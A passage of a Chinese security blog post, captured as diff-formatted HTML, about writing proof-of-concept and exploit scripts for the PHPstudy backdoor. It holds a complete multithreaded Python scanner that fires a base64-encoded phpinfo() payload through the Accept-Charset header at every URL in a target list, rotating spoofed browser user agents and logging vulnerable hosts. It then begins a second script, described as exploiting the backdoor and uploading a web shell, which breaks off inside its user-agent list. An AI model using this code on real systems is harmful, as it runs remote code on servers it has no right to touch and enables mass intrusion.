@@ -1,0 +1,1233 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="code,poc,exp," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demos's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="PHPstudy后门漏洞POC-EXP编写 phpstudy后门事件过去有一段时间了，漏洞也已经复现了；网上有好多检测的POC，为什么要自己写呢，因为好久没有写代码了，通过这个漏洞巩固一下code，代码国庆前写了一半，被各种事情耽搁，今天补写完整。这次写代码使用面向对象以及参数化编写，就漏洞本身来说，这种方式很麻烦，但是为了毕设的代码量练习（小声BB）。脚本支持PHPstudy2018和2016后">
+<meta name="keywords" content="code,poc,exp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHPstudy后门漏洞POC-EXP编写">
+<meta property="og:url" content="https://www.lsowl.top/2019/10/14/PHPstudy后门漏洞POC-EXP编写/index.html">
+<meta property="og:site_name" content="Demos&#39;s Blog">
+<meta property="og:description" content="PHPstudy后门漏洞POC-EXP编写 phpstudy后门事件过去有一段时间了，漏洞也已经复现了；网上有好多检测的POC，为什么要自己写呢，因为好久没有写代码了，通过这个漏洞巩固一下code，代码国庆前写了一半，被各种事情耽搁，今天补写完整。这次写代码使用面向对象以及参数化编写，就漏洞本身来说，这种方式很麻烦，但是为了毕设的代码量练习（小声BB）。脚本支持PHPstudy2018和2016后">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570982761.17.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570982822.79.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983146.36.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983187.58.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983388.91.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983409.4.png">
+<meta property="og:updated_time" content="2019-10-13T16:45:23.303Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHPstudy后门漏洞POC-EXP编写">
+<meta name="twitter:description" content="PHPstudy后门漏洞POC-EXP编写 phpstudy后门事件过去有一段时间了，漏洞也已经复现了；网上有好多检测的POC，为什么要自己写呢，因为好久没有写代码了，通过这个漏洞巩固一下code，代码国庆前写了一半，被各种事情耽搁，今天补写完整。这次写代码使用面向对象以及参数化编写，就漏洞本身来说，这种方式很麻烦，但是为了毕设的代码量练习（小声BB）。脚本支持PHPstudy2018和2016后">
+<meta name="twitter:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570982761.17.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.lsowl.top/2019/10/14/PHPstudy后门漏洞POC-EXP编写/"/>
+
+
+
+
+
+  <title>PHPstudy后门漏洞POC-EXP编写 | Demos's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Demos's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">It's A Long Road</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.lsowl.top/2019/10/14/PHPstudy后门漏洞POC-EXP编写/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Demos">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Demos's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PHPstudy后门漏洞POC-EXP编写</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-14T00:42:21+08:00">
+                2019-10-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/POC-EXP编写/" itemprop="url" rel="index">
+                    <span itemprop="name">POC/EXP编写</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="PHPstudy后门漏洞POC-EXP编写"><a href="#PHPstudy后门漏洞POC-EXP编写" class="headerlink" title="PHPstudy后门漏洞POC-EXP编写"></a>PHPstudy后门漏洞POC-EXP编写</h3><blockquote>
+<p>phpstudy后门事件过去有一段时间了，漏洞也已经复现了；网上有好多检测的POC，为什么要自己写呢，因为好久没有写代码了，通过这个漏洞巩固一下code，代码国庆前写了一半，被各种事情耽搁，今天补写完整。这次写代码使用面向对象以及参数化编写，就漏洞本身来说，这种方式很麻烦，但是为了毕设的代码量练习（小声BB）。脚本支持PHPstudy2018和2016后门漏洞的检测、利用以及直接上传shell。</p>
+</blockquote>
+<h3 id="代码-and-效果"><a href="#代码-and-效果" class="headerlink" title="代码 and 效果"></a>代码 and 效果</h3><h4 id="批量检测POC"><a href="#批量检测POC" class="headerlink" title="批量检测POC"></a>批量检测POC</h4><p>支持自定义输入目标文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: demos</span></span><br><span class="line"><span class="string">@Github: https://github.com/demossl</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line">TIME_OUT=<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url)</span>:</span></span><br><span class="line">    payload = <span class="string">"phpinfo();"</span></span><br><span class="line">    payload = base64.b64encode(payload.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">    headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">    headers[<span class="string">'Accept-Charset'</span>] = payload</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = requests.get(url,headers=headers,timeout=TIME_OUT)</span><br><span class="line">        result.encoding = <span class="string">'gbk'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"phpinfo"</span> <span class="keyword">in</span> str(result.content):</span><br><span class="line">            print(<span class="string">'[+] Target is vulnerable.'</span>)</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'success.txt'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(url + <span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] Target is NOT vulnerable.'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'[-] some error!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    files = input(<span class="string">'please input the files:\n'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(files,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            lines = f.read().splitlines()</span><br><span class="line">            print(lines)</span><br><span class="line">            task_pool = threadpool.ThreadPool(<span class="number">10</span>)</span><br><span class="line">            requests = threadpool.makeRequests(check,lines)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line">            task_pool.putRequest(req)</span><br><span class="line">            task_pool.wait()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570982761.17.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570982822.79.png" alt=""></p>
+<h4 id="带参数检测、利用、传shell"><a href="#带参数检测、利用、传shell" class="headerlink" title="带参数检测、利用、传shell"></a>带参数检测、利用、传shell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: demos</span></span><br><span class="line"><span class="string">@Github: https://github.com/demossl</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; 